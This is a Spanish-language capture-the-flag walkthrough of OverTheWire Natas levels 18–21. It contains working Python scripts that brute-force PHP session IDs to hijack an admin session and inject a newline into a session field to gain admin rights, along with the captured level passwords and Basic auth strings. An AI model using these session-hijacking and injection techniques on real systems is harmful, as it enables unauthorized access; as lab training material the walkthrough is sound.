agknoquvwxDEFGJLNPQU
agknoquvwxDEFGJLNPQUV
agknoquvwxDEFGJLNPQUVZ
agknoquvwxDEFGJLNPQUVZ4
agknoquvwxDEFGJLNPQUVZ46
agknoquvwxDEFGJLNPQUVZ468
agknoquvwxDEFGJLNPQUVZ468
8
8N
8NE
8NED
8NEDU
8NEDUU
8NEDUUx
8NEDUUxg
8NEDUUxg8
8NEDUUxg8k
8NEDUUxg8kF
8NEDUUxg8kFg
8NEDUUxg8kFgP
8NEDUUxg8kFgPV
8NEDUUxg8kFgPV8
8NEDUUxg8kFgPV84
8NEDUUxg8kFgPV84u
8NEDUUxg8kFgPV84uL
8NEDUUxg8kFgPV84uLw
8NEDUUxg8kFgPV84uLwv
8NEDUUxg8kFgPV84uLwvZ
8NEDUUxg8kFgPV84uLwvZk
8NEDUUxg8kFgPV84uLwvZkG
8NEDUUxg8kFgPV84uLwvZkGn
8NEDUUxg8kFgPV84uLwvZkGn6
8NEDUUxg8kFgPV84uLwvZkGn6o
8NEDUUxg8kFgPV84uLwvZkGn6ok
8NEDUUxg8kFgPV84uLwvZkGn6okJ
8NEDUUxg8kFgPV84uLwvZkGn6okJQ
8NEDUUxg8kFgPV84uLwvZkGn6okJQ6
8NEDUUxg8kFgPV84uLwvZkGn6okJQ6a
8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
```

## <mark style="color:purple;">Natas 18</mark>

<figure><img src="/files/NXRFK2pDzxUUjeRNRj9Q" alt=""><figcaption></figcaption></figure>

Cuando intentamos loguernos nos da este error:

<figure><img src="/files/5QfUoLjz0mLCiWxNwNWI" alt=""><figcaption></figcaption></figure>

En el codigo fuente nos encontramos este script:

```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

Observamos que nos signa un PHPSESSID, y que si coincide con el SSID de admin nos devuelve la contraseña, por lo que crearemos un script en python para automatizarlo:

```python
import requests

for i in range(700):
    url = "http://natas18.natas.labs.overthewire.org/index.php"
    payload = {"username": "admin", "password": "aa"}
    headers = {"Cookie": "PHPSESSID={0}".format(i), "Authorization": "Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ=="}

    r = requests.post(url, params=payload, headers=headers)

    if "You are logged in as a regular user" in r.text:
        print("fail")
    else:
        print(r.text)
        exit()
```

```
python exploit.py
fail
fail
fail
fail
fail
fail
fail
...SNIP...
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas18", "pass": "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq" };</script></head>
<body>
<h1>natas18</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas19
Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## <mark style="color:purple;">Natas 19</mark>

<figure><img src="/files/vja2IzGyGw8ofUCvDJCZ" alt=""><figcaption></figcaption></figure>

* Nos dice que es similar al nivel anterior pero que no utiliza IDs secuenciales

<figure><img src="/files/JiRPKTbFba3UI2O2oM0c" alt=""><figcaption></figcaption></figure>

El nuevo formato de PHPSESSID es "`3539362d61646d696e`" y parece relacionarse con "`596-admin`", podríamos modificar el script para generar PHPSESSIDs en ese formato específico:

{% code title="exploit.py" %}

```python
import requests
import binascii

for i in range(1, 641):  # Ajusta el rango según sea necesario
    session_id = str(i) + "-admin"
    hex_session_id = binascii.hexlify(session_id.encode()).decode()
    
    url = "http://natas19.natas.labs.overthewire.org/index.php"
    payload = {"name": "admin", "password": "aa"}
    cookies = {"PHPSESSID": hex_session_id}
    headers = {"Authorization": "Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw=="}

    r = requests.post(url, params=payload, cookies=cookies, headers=headers)

    if "You are logged in as a regular user" not in r.text:
        print(r.text)
        exit()

print("No se encontró la contraseña.")
```

{% endcode %}

```html
python exploit.py

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas19", "pass": "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s" };</script></head>
<body>
<h1>natas19</h1>
<div id="content">
<p>
<b>
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
</b>
</p>
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH</pre></div>
</body>
```

## <mark style="color:purple;">Natas 20</mark>

<figure><img src="/files/V9venyiTesaqkeDb45LO" alt=""><figcaption></figcaption></figure>

En el codigo fuente nos encontramos con un script en php bastante extenso, en el que vemos la siguiente función:

```php
function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}
```

El PHPSESSID es alfanumérico en este nivel. También observamos lo siguiente:

```php
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

# Nos fijamos en esta línea:
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)
```

Entonces, si podemos escribir "`admin 1`" en el archivo de sesiones, deberíamos poder iniciar sesión como administrador. Intentemos eso con un script a medida:

{% code title="" %}

```python
import requests

username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"
url = "http://natas20.natas.labs.overthewire.org"

# -----------------------------------
payload = dict(name="test\nadmin 1")
# -----------------------------------

# Send the payload
r = requests.post(url, auth=(username, password), data=payload)
cookie = r.cookies.get_dict()

# Request with cookie from previous POST request
d = requests.get(url, auth=(username, password), cookies=cookie)

# Format the output for better readability
print("Response Headers:")
print(d.headers)
print("\nResponse Content:")
print(d.content.decode('utf-8'))
```

{% endcode %}

```html
python exploit.py

Response Headers:
{'Date': 'Tue, 07 Nov 2023 08:49:02 GMT', 'Server': 'Apache/2.4.52 (Ubuntu)', 'Expires': 'Thu, 19 Nov 1981 08:52:00 GMT', 'Cache-Control': 'no-store, no-cache, must-revalidate', 'Pragma': 'no-cache', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '681', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
Response Content:
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas20", "pass": "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH" };</script></head>
<body>
<h1>natas20</h1>
<div id="content">
You are an admin. The credentials for the next level are:<br><pre>Username: natas21
Password: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56</pre>
```

## <mark style="color:purple;">Natas 21</mark>

<figure><img src="/files/ahSpJYDFDAFmHZzfmaUV" alt=""><figcaption></figcaption></figure>

En el codigo fuente hay el siguiente script en php:

```php
<?php

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

La web dice que se encuentra realojada en un subdominio experimenter. Al ir a la web nos pide credenciales, introducimos las del nivel actual y nos logueamos con éxito:

<figure><img src="/files/Kcglzmo4w7SfCa3d27vM" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/kxhoG0URO5IKoL0kL1bt" alt=""><figcaption></figcaption></figure>

En esta web podemos interactuar con el CSS directamente desde el frontal. En el codigo fuente nos encontramos este script en php:

```php
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

<figure><img src="/files/RmwFxzPbprULFJtOkNsq" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/K8C3hFKLvNn7QOT9FmCl" alt=""><figcaption></figcaption></figure>
